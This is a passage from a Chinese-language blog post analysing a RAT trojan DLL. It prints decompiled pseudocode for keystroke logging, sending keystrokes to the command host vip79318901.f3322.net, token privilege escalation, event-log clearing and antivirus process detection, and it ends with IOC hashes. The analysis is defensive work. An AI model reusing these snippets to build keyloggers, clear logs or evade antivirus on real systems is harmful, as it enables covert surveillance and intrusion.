  &#123;</span><br><span class="line">        lstrcatA(&amp;<span class="keyword">String</span>, String2);</span><br><span class="line">        sub_10002450(&amp;<span class="keyword">String</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( lstrlenA(&amp;<span class="keyword">String</span>) &lt;= <span class="number">550</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">13</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v6 % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                lstrcatA(&amp;<span class="keyword">String</span>, off_10011248[v2]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( !(v6 % <span class="number">2</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                lstrcatA(&amp;<span class="keyword">String</span>, off_100110B4[v2]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        &#125;</span><br><span class="line">    lstrcatA(&amp;<span class="keyword">String</span>, aEnter);</span><br><span class="line">    sub_10002450(&amp;<span class="keyword">String</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_10002450(&amp;<span class="keyword">String</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="keyword">String</span>, <span class="number">0</span>, <span class="number">0x258</span>u);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( GetKeyState(<span class="number">20</span>) &amp;&amp; v5 &gt; <span class="number">-1</span> &amp;&amp; v4 &gt; <span class="string">'@'</span> &amp;&amp; v4 &lt; <span class="string">']'</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *(&amp;v8 + v4) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将击键记录的内容传输给url：vip79318901.f3322.net ：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v1 = *&amp;asc_10011BA4;</span><br><span class="line">    lstrcatA(&amp;String1, aVip79318901F33);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;String1, byte_10013470) )</span><br><span class="line">&#123;</span><br><span class="line">    v3 = GetTickCount();</span><br><span class="line">    <span class="keyword">if</span> ( connect_url_10001D00(v8, &amp;String1, v1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>sub_10003AB0(v23, v8)</code>通过检索函数表来调用<code>switch_case_10003D30</code>：</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v2 = &amp;off_1000C30C;</span><br><span class="line">v2[<span class="number">1004</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">1000</span>C30C off_1000C30C    dd offset sub_10003A40  ; DATA XREF: sub_100039F0+<span class="number">11</span>↑o</span><br><span class="line">.rdata:<span class="number">1000</span>C30C                                         ; sub_10003A60+C↑o ...</span><br><span class="line">.rdata:<span class="number">1000</span>C310                 dd offset switch_case_10003D30</span><br></pre></td></tr></table></figure>
+
+<p><code>switch_case_10003D30</code>函数通过判断不同的情况操作：</p>
+<p>提权：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x70</span>u:</span><br><span class="line">    v5 = create_thread_100080D0(<span class="number">0</span>, <span class="number">0</span>, privilege_10002CE0, *(<span class="keyword">this</span>[<span class="number">1</span>] + <span class="number">72</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>提权的关键函数通过<code>OpenProcessToken</code>得到进程的令牌句柄，使用<code>LookupPrivilegeValue</code>查询进程权限，最后用<code>AdjustTokenPrivileges</code>函数提升权限：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LookupPrivilegeValueA(<span class="number">0</span>, Name, NewState.Privileges);</span><br><span class="line">NewState.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">NewState.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>删除日志：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">    delete_event_log_10002E20(a2[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>删除日志函数通过<code>OpenEventLog</code>函数打开日志文件，如果成功打开，调用<code>ClearEventLog</code>函数清除日志文件，最后调用<code>CloseEventLog</code>函数关闭日志文件：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v3 = OpenEventLogA(<span class="number">0</span>, *v2);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">        ClearEventLogA(v3, <span class="number">0</span>);</span><br><span class="line">        CloseEventLog(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v2;</span><br><span class="line">    result = v8-- - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弹出MessageBox：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">    v5 = create_thread_100080D0(<span class="number">0</span>, <span class="number">0</span>, msgbox_10002DD0, (a2 + <span class="number">1</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>查询进程镜像以反杀毒软件：</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;v174, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">v1 = LoadLibraryA(aKernel32Dll_1);</span><br><span class="line">creat_tool_help = GetProcAddress(v1, aCreatetoolhelp);</span><br><span class="line">pro32_first = GetProcAddress(v1, aProcess32first);</span><br><span class="line">pro32_next = GetProcAddress(v1, aProcess32next);</span><br><span class="line">pro_list = (creat_tool_help)(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( pro_list )</span><br><span class="line">&#123;</span><br><span class="line">    v175 = <span class="number">296</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(Str, SubStr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = &amp;Str;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (pro32_first)(pro_list, &amp;v175) )</span><br><span class="line">            &#123;</span><br><span class="line">                v5 = *v4;</span><br><span class="line">                <span class="keyword">while</span> ( lstrcmpiA(v5, &amp;String2) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( !(pro32_next)(pro_list, &amp;v175) )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">            &#125;</span><br><span class="line">            lstrcatA(lpString1, v4[<span class="number">1</span>]);</span><br><span class="line">            lstrcatA(lpString1, SubStr);</span><br><span class="line">            &#125;</span><br><span class="line">            LABEL_10:</span><br><span class="line">            v6 = v4[<span class="number">2</span>];</span><br><span class="line">            v4 += <span class="number">2</span>;</span><br><span class="line">            v175 = <span class="number">296</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(v6, SubStr) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(pro_list);</span><br><span class="line">result = lstrlenA(lpString1);</span><br><span class="line"><span class="keyword">if</span> ( !result )</span><br><span class="line">    result = lstrcpyA(lpString1, asc_100121B8);</span><br><span class="line"><span class="keyword">if</span> ( v1 )</span><br><span class="line">    result = FreeLibrary(v1);</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<p>查询的杀毒软件列表如下：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record15.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record16.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record17.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record18.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record19.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record20.PNG" alt></p>
+<h3 id="导出函数fuckyou"><a href="#导出函数fuckyou" class="headerlink" title="导出函数fuckyou"></a>导出函数fuckyou</h3><p>导出函数<code>fuckyou</code>的功能与DllMain基本一致，主要也是调用<code>attackfun_100063D0</code>来进行恶意行为以及一些保持服务常驻的操作：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record21.PNG" alt></p>
+<h3 id="其他一些可疑操作"><a href="#其他一些可疑操作" class="headerlink" title="其他一些可疑操作"></a>其他一些可疑操作</h3><p>程序还存在写入文件到%SystemDirectory%\1521.key的操作，配合击键记录函数进行击键记录：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GetSystemDirectoryA(&amp;Buffer, <span class="number">0x104</span>u);</span><br><span class="line"><span class="built_in">strcat</span>(&amp;Buffer, asc_1001172C);</span><br><span class="line"><span class="built_in">strcat</span>(&amp;Buffer, a1521);</span><br><span class="line"><span class="built_in">strcat</span>(&amp;Buffer, aKey);</span><br><span class="line">v1 = CreateFileA(&amp;Buffer, <span class="number">0x40000000</span>u, <span class="number">2u</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是在沙箱运行中并为发现文件的写入操作。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该程序是RAT木马，具有提权，击键记录，删除日志，反杀毒软件等功能，可用于建立僵尸网络，发送垃圾邮箱来进行APT攻击。</p>
+<p>该程序在一些主流的杀毒软件测试中均未报毒，具有很强的威胁性：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record22.PNG" alt></p>
+<h2 id="相关IOC"><a href="#相关IOC" class="headerlink" title="相关IOC"></a>相关IOC</h2><table>
+<thead>
+<tr>
+<th>list</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MD5</td>
+<td>ae318e417963fbaec1c0664b9162b63d</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>965b9b5be709e95950fd10ab1614edf3ab1ae70d</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td>10eeadc0c512fa8d52ee66f3d181f2ec9de65cba5c08559eea20b60d41867876</td>
+</tr>
+<tr>
+<td>Vhash</td>
+<td>04505666151d15104012z180055mz6gz</td>
+</tr>
+<tr>
+<td>Authentihash</td>
+<td>058ca13631c7f65271190aaad5b67bc259d18c0b71d4fc368820b150facc655f</td>
+</tr>
+<tr>
+<td>Imphash</td>
+<td>926997c7dd52b150779d1291ece24039</td>
+</tr>
+<tr>
+<td>SSDEEP</td>
+<td>3072:3abe6nVEb7Mt+e74m3mOsr5PrQ+EGCZs+RbjySnKv:3yeH/e7hAr5DQ+yZvqSK</td>
+</tr>
+<tr>
+<td>File type</td>
+<td>Win32 EXE</td>
+</tr>
+<tr>
+<td>Magic</td>
+<td>PE32 executable for MS Windows (GUI) Intel 80386 32-bit</td>
+</tr>
+<tr>
+<td>File size</td>
+<td>428.00 KB (438272 bytes)</td>
+</tr>
+<tr>
+<td>PEiD packer</td>
+<td>Microsoft Visual C++</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/10/note20200710/" rel="next" title="note20200710">
+                <i class="fa fa-chevron-left"></i> note20200710
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ivoripuion" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1711268@mail.nankai.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#样本分析"><span class="nav-number">1.</span> <span class="nav-text">样本分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#沙箱分析"><span class="nav-number">1.1.</span> <span class="nav-text">沙箱分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PE文件分析"><span class="nav-number">1.2.</span> <span class="nav-text">PE文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DllMain分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">DllMain分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导出函数fuckyou"><span class="nav-number">1.2.2.</span> <span class="nav-text">导出函数fuckyou</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他一些可疑操作"><span class="nav-number">1.2.3.</span> <span class="nav-text">其他一些可疑操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关IOC"><span class="nav-number">1.4.</span> <span class="nav-text">相关IOC</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
